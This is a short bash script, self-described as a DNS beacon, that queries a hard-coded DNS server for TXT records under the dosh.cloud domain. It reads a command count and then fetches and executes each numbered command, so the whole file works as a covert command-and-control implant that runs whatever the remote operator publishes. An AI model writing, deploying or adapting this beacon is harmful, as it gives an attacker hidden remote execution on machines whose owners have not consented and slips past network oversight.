#!/bin/bash
# Beacon to DNS server 

domain=".dosh.cloud"

# Get the number of commands to query for
num=$(dig @129.21.130.212 -t txt +short num.dosh.cloud)
len=$(echo ${#num})
num=$(echo ${num:1:len-2})
echo $num

# Loop through gathering each command and executing
x=1
while [ $x -le $num ]; do
    cmd=$(dig @129.21.130.212 -t txt +short $x$domain)
    len=$(echo ${#cmd})
    cmd=$(echo ${cmd:1:len-2})
    $cmd
    let x=x+1
done
